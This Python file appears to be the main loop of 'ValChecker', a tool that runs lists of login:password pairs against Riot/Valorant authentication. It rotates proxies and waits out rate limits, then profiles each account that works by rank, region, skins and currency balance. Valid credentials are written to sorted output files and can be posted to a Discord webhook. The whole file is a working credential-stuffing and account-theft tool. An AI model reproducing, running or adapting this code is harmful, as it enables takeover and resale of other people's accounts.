import ctypes
import datetime
import os
import time
import traceback
import keyboard
from os.path import exists

from colorama import Fore, Style

from codeparts import auth, checkers, systems

check=checkers.checkers()
sys=systems.system()

class simplechecker():
    def __init__(self,settings:list,proxylist) -> None:
        self.proxylist=proxylist
        self.max_rlimits=settings['max_rlimits']
        self.rlimit_wait=settings['rlimit_wait']
        self.default_reg=settings['default_region']
        self.cooldown=int(settings['cooldown'])
        self.autosort=settings['auto_sort']
        self.webhook=settings['webhook'].replace(' ','')

        try:
            import discord_webhook
        except ModuleNotFoundError:
            if self.webhook != '':
                print('use "pip install discord_webhook" to use your webhook')
                input('press enter to continue without using the webhook')
                self.webhook=''
            else:
                pass

        path = os.getcwd()
        self.parentpath=os.path.abspath(os.path.join(path, os.pardir))

        self.checked=0
        self.valid=0
        self.banned=0
        self.skins=0
        self.unverifiedmail=0
        self.err=0
        self.rlimits=0
        self.riotlimitinarow=0

        if self.proxylist != None:
            self.proxycount=len(proxylist)
        else:
            self.proxycount=0

        self.run=True
        self.runningtext=f'{Fore.LIGHTGREEN_EX}Running{Fore.RESET}'

        self.ranks={'unranked':0,'iron':0,'bronze':0,'silver':0,'gold':0,'platinum':0,'diamond':0,
        'ascendant':0,'immortal':0,'radiant':0,'unknown':0}
        self.skinsam={'1-10':0,'10-20':0,'20-35':0,'35-40':0,'40-70':0,'70+':0}
        self.locked=0

        self.regions={'eu':0,'na':0,'ap':0,'br':0,'kr':0,'latam':0,'unknown':0}

    def main(self,accounts,count):
        reset = Fore.RESET
        cyan = Fore.CYAN
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        space = " "
        authenticate=auth.auth(self.proxylist)
        if self.webhook == '':
            whtext=f"{red}Not using a webhook{reset}"
        else:
            whtext=f'{green}Using the webhook{reset}'
        os.system(f'mode con: cols=150 lines=32')
        for account in accounts:
            while True:
                if self.run==False:
                    self.runningtext=f'{Fore.YELLOW}Paused{reset}'
                    while True:
                        if keyboard.is_pressed('P'):
                            self.runningtext=f'{green}Running{reset}'
                            self.run=True
                            break
                ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker by liljaba1337 | Checked {self.checked}/{count}')
                os.system('cls')
                print(f'''
        {reset}
        {sys.center('https://github.com/LIL-JABA/valchecker')}

        {sys.center(f'Proxies: {cyan}{self.proxycount}{reset}  |  Accounts: {cyan}{count}{reset}  |  Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{count}{reset}  |  {self.runningtext} | {whtext}')}
        {reset}
{cyan} ┏━ Main ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Regions ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Skins ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{cyan} ┃ [{reset}>{cyan}] {reset}Valid          >>:{cyan}[{green}{self.valid}{cyan}]{space * (12 - len(str(self.valid)))}┃ ┃ [{reset}>{cyan}] {reset}EU            >>:{cyan}[{green}{self.regions['eu']}{cyan}]{space * (18 - len(str(self.regions['eu'])))}┃ ┃ [{reset}>{cyan}] {reset}1-10            >>:{cyan}[{green}{self.skinsam['1-10']}{cyan}]{space * (29 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Banned         >>:{cyan}[{red}{self.banned}{cyan}]{space * (12 - len(str(self.banned)))}┃ ┃ [{reset}>{cyan}] {reset}NA            >>:{cyan}[{green}{self.regions['na']}{cyan}]{space * (18 - len(str(self.regions['na'])))}┃ ┃ [{reset}>{cyan}] {reset}10-20           >>:{cyan}[{green}{self.skinsam['10-20']}{cyan}]{space * (29 - len(str(self.skinsam['10-20'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Rate Limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}AP            >>:{cyan}[{green}{self.regions['ap']}{cyan}]{space * (18 - len(str(self.regions['ap'])))}┃ ┃ [{reset}>{cyan}] {reset}20-35           >>:{cyan}[{green}{self.skinsam['20-35']}{cyan}]{space * (29 - len(str(self.skinsam['20-35'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70+             >>:{cyan}[{green}{self.skinsam['70+']}{cyan}]{space * (29 - len(str(self.skinsam['70+'])))}┃
{cyan} ┃                                     ┃ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┏━━ Ranks ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┏━ Not main ━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ [{reset}>{cyan}] {reset}Unranked      >>:{cyan}[{green}{self.ranks['unranked']}{cyan}]{space * (18 - len(str(self.ranks['unranked'])))}┃ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}With Skins       >>:{cyan}[{green}{self.skins}{cyan}]{space * (10 - len(str(self.skins)))}┃ ┃ [{reset}>{cyan}] {reset}Iron          >>:{cyan}[{green}{self.ranks['iron']}{cyan}]{space * (18 - len(str(self.ranks['iron'])))}┃ ┃                                                       ┃
{cyan} ┃ [{reset}>{cyan}] {reset}Unverified Mail  >>:{cyan}[{green}{self.unverifiedmail}{cyan}]{space * (10 - len(str(self.unverifiedmail)))}┃ ┃ [{reset}>{cyan}] {reset}Bronze        >>:{cyan}[{green}{self.ranks['bronze']}{cyan}]{space * (18 - len(str(self.ranks['bronze'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Silver        >>:{cyan}[{green}{self.ranks['silver']}{cyan}]{space * (18 - len(str(self.ranks['silver'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Gold          >>:{cyan}[{green}{self.ranks['gold']}{cyan}]{space * (18 - len(str(self.ranks['gold'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Platinum      >>:{cyan}[{green}{self.ranks['platinum']}{cyan}]{space * (18 - len(str(self.ranks['platinum'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Diamond       >>:{cyan}[{green}{self.ranks['diamond']}{cyan}]{space * (18 - len(str(self.ranks['diamond'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Ascendant     >>:{cyan}[{green}{self.ranks['ascendant']}{cyan}]{space * (18 - len(str(self.ranks['ascendant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Immortal      >>:{cyan}[{green}{self.ranks['immortal']}{cyan}]{space * (18 - len(str(self.ranks['immortal'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Radiant       >>:{cyan}[{green}{self.ranks['radiant']}{cyan}]{space * (18 - len(str(self.ranks['radiant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Locked        >>:{cyan}[{green}{self.locked}{cyan}]{space * (18 - len(str(self.locked)))}┃ ┃                                                       ┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}

            ''')
                try:
                    token,entt,uuid,mailverif=authenticate.auth(account)
                    if token == 2:
                        with open(f'{self.parentpath}/log.txt','a') as f:
                            f.write(f'({datetime.datetime.now()}) {mailverif}\n_________________________________\n')
                        self.err+=1
                    elif token==1:
                        if self.riotlimitinarow<self.max_rlimits:
                            print(sys.center(f'riot limit. waiting {self.rlimit_wait} seconds'))
                            time.sleep(self.rlimit_wait)
                            self.riotlimitinarow+=1
                            continue
                        else:
                            print(sys.center(f'{self.max_rlimits} riot limits in a row. skipping'))
                            self.riotlimitinarow=0
                            self.rlimits+=1
                            self.checked+=1
                            with open (f'{self.parentpath}/output/riot_limits.txt', 'a', encoding='UTF-8') as file:
                                file.write(f'\n{account}')
                            break
                    elif token==3:
                        pass
                    elif token==0:
                        pass
                    elif token==4:
                        self.banned+=1
                    else:
                        if mailverif==True:
                            self.unverifiedmail+=1
                        while True:
                            reg,lvl=sys.get_region(token)
                            if reg!=False and reg!='' and reg != 'False':
                                self.regions[str(reg).lower()]+=1
                                if int(lvl)<20:
                                    self.locked+=1
                                    rank='locked'
                                else:
                                    rank=check.ranked(entt,token,uuid,reg).lower().split(' ')[0]
                                    try:
                                        self.ranks[rank]+=1
                                    except:
                                        self.ranks['unknown']+=1
                                skins=check.skins_en(entt,token,uuid,reg)
                                vp,rp=check.balance(entt,token,uuid,reg)
                                skinscount=len(skins.split('\n'))
                                skinscount-=1
                                if skinscount>0:
                                    self.skins+=1
                                    if skinscount>70:
                                        self.skinsam['70+']+=1
                                    elif skinscount>40:
                                        self.skinsam['40-70']+=1
                                    elif skinscount>35:
                                        self.skinsam['35-40']+=1
                                    elif skinscount>20:
                                        self.skinsam['20-35']+=1
                                    elif skinscount>10:
                                        self.skinsam['10-20']+=1
                                    else:
                                        self.skinsam['1-10']+=1
                                lastplayed=check.lastplayed(uuid,reg,token,entt)
                                break
                            else:
                                reg=self.default_reg
                                if lvl != 'N/A':
                                    if int(lvl)<20:
                                        self.locked+=1
                                        rank='locked'
                                    else:
                                        rank=check.ranked(entt,token,uuid,reg).lower().split(' ')[0]
                                        try:
                                            self.ranks[rank]+=1
                                        except:
                                            self.ranks['unknown']+=1
                                skins=check.skins_en(entt,token,uuid,reg)
                                skinscount=len(skins.split('\n'))
                                skinscount-=1
                                if skinscount>0:
                                    self.regions[str(self.default_reg).lower()]+=1
                                    self.skins+=1
                                    if skinscount>70:
                                        self.skinsam['70+']+=1
                                    elif skinscount>40:
                                        self.skinsam['40-70']+=1
                                    elif skinscount>35:
                                        self.skinsam['35-40']+=1
                                    elif skinscount>20:
                                        self.skinsam['20-35']+=1
                                    elif skinscount>10:
                                        self.skinsam['10-20']+=1
                                    else:
                                        self.skinsam['1-10']+=1
                                    lastplayed=check.lastplayed(uuid,reg,token,entt)
                                else:
                                    lastplayed='N/A'
                                    self.ranks['unknown']+=1
                                    self.regions['unknown']+=1
                                    rank='N/A'
                                    skinscount='N/A'
                                    skins='N/A\n'
                                    reg='N/A'
                                break
                        with open (f'{self.parentpath}/output/valid.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'''|[{account}]
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓          
|region---------> {reg}
|rank-----------> {rank}
|level----------> {lvl}
|lastmatch------> {lastplayed}
|unverifiedmail-> {mailverif}
|vp-------------> {vp}
|rp-------------> {rp}
|[ {skinscount} skins ]
{skins}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
###account###

''')
                        # sort
                        self.valid+=1
                        if self.autosort=='True' and rank != 'N/A' and reg != 'N/A':
                            if not exists(f'{self.parentpath}/output/regions/'):
                                os.mkdir(f'{self.parentpath}/output/regions/')
                            if not exists(f'{self.parentpath}/output/regions/{reg}/'):
                                os.mkdir(f'{self.parentpath}/output/regions/{reg}/')
                            with open(f'{self.parentpath}/output/regions/{reg}/{rank}.txt','a',encoding='UTF-8') as file:
                                file.write(f'''|[{account}]
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓          
|region---------> {reg}
|rank-----------> {rank}
|level----------> {lvl}
|lastmatch------> {lastplayed}
|unverifiedmail-> {mailverif}
|vp-------------> {vp}
|rp-------------> {rp}
|[ {skinscount} skins ]
{skins}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
###account###

''')
                        if self.webhook != '' and reg != 'N/A':
                            from discord_webhook import DiscordWebhook, DiscordEmbed
                            dcwebhook = DiscordWebhook(url=self.webhook)
                            embed = DiscordEmbed(title='New valid account', color='34eb43')
                            embed.set_author(name='valkeker')
                            embed.set_timestamp()
                            embed.add_embed_field(name='LogPass', value=account)
                            embed.add_embed_field(name='Region', value=reg)
                            embed.add_embed_field(name='Rank', value=rank)
                            embed.add_embed_field(name='Level', value=lvl)
                            embed.add_embed_field(name='Lastmatch', value=lastplayed)
                            embed.add_embed_field(name='Unverifiedmail', value=mailverif)
                            embed.add_embed_field(name=f'VP', value=vp)
                            embed.add_embed_field(name=f'RP', value=rp)
                            embed.add_embed_field(name=f'Skins ({skinscount})',value=skins)
                            dcwebhook.add_embed(embed)
                            response=dcwebhook.execute()
                except Exception as e:
                    with open(f'{self.parentpath}/log.txt','a') as f:
                        f.write(f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
                    self.err+=1
                self.checked+=1
                time.sleep(self.cooldown)
                break

        # idk how to better check the last account
        os.system('cls')
        self.runningtext=f'{green}Finished{reset}'
        print(f'''
    {sys.center('https://github.com/LIL-JABA/valchecker')}
    {sys.center(f'Proxies: {cyan}{self.proxycount}{reset}  |  Accounts: {cyan}{count}{reset}  |  Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{count}{reset}  |  {self.runningtext} | {whtext}')}
        {reset}
{cyan} ┏━ Main ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Regions ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Skins ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{cyan} ┃ [{reset}>{cyan}] {reset}Valid          >>:{cyan}[{green}{self.valid}{cyan}]{space * (12 - len(str(self.valid)))}┃ ┃ [{reset}>{cyan}] {reset}EU            >>:{cyan}[{green}{self.regions['eu']}{cyan}]{space * (18 - len(str(self.regions['eu'])))}┃ ┃ [{reset}>{cyan}] {reset}1-10            >>:{cyan}[{green}{self.skinsam['1-10']}{cyan}]{space * (29 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Banned         >>:{cyan}[{red}{self.banned}{cyan}]{space * (12 - len(str(self.banned)))}┃ ┃ [{reset}>{cyan}] {reset}NA            >>:{cyan}[{green}{self.regions['na']}{cyan}]{space * (18 - len(str(self.regions['na'])))}┃ ┃ [{reset}>{cyan}] {reset}10-20           >>:{cyan}[{green}{self.skinsam['10-20']}{cyan}]{space * (29 - len(str(self.skinsam['10-20'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Rate Limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}AP            >>:{cyan}[{green}{self.regions['ap']}{cyan}]{space * (18 - len(str(self.regions['ap'])))}┃ ┃ [{reset}>{cyan}] {reset}20-35           >>:{cyan}[{green}{self.skinsam['20-35']}{cyan}]{space * (29 - len(str(self.skinsam['20-35'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70+             >>:{cyan}[{green}{self.skinsam['70+']}{cyan}]{space * (29 - len(str(self.skinsam['70+'])))}┃
{cyan} ┃                                     ┃ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┏━━ Ranks ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┏━ Not main ━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ [{reset}>{cyan}] {reset}Unranked      >>:{cyan}[{green}{self.ranks['unranked']}{cyan}]{space * (18 - len(str(self.ranks['unranked'])))}┃ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
{cyan} ┃ [{reset}>{cyan}] {reset}With Skins       >>:{cyan}[{green}{self.skins}{cyan}]{space * (10 - len(str(self.skins)))}┃ ┃ [{reset}>{cyan}] {reset}Iron          >>:{cyan}[{green}{self.ranks['iron']}{cyan}]{space * (18 - len(str(self.ranks['iron'])))}┃ ┃                                                       ┃
{cyan} ┃ [{reset}>{cyan}] {reset}Unverified Mail  >>:{cyan}[{green}{self.unverifiedmail}{cyan}]{space * (10 - len(str(self.unverifiedmail)))}┃ ┃ [{reset}>{cyan}] {reset}Bronze        >>:{cyan}[{green}{self.ranks['bronze']}{cyan}]{space * (18 - len(str(self.ranks['bronze'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Silver        >>:{cyan}[{green}{self.ranks['silver']}{cyan}]{space * (18 - len(str(self.ranks['silver'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Gold          >>:{cyan}[{green}{self.ranks['gold']}{cyan}]{space * (18 - len(str(self.ranks['gold'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Platinum      >>:{cyan}[{green}{self.ranks['platinum']}{cyan}]{space * (18 - len(str(self.ranks['platinum'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Diamond       >>:{cyan}[{green}{self.ranks['diamond']}{cyan}]{space * (18 - len(str(self.ranks['diamond'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Ascendant     >>:{cyan}[{green}{self.ranks['ascendant']}{cyan}]{space * (18 - len(str(self.ranks['ascendant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Immortal      >>:{cyan}[{green}{self.ranks['immortal']}{cyan}]{space * (18 - len(str(self.ranks['immortal'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Radiant       >>:{cyan}[{green}{self.ranks['radiant']}{cyan}]{space * (18 - len(str(self.ranks['radiant'])))}┃ ┃                                                       ┃
{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}Locked        >>:{cyan}[{green}{self.locked}{cyan}]{space * (18 - len(str(self.locked)))}┃ ┃                                                       ┃
{cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}

            ''')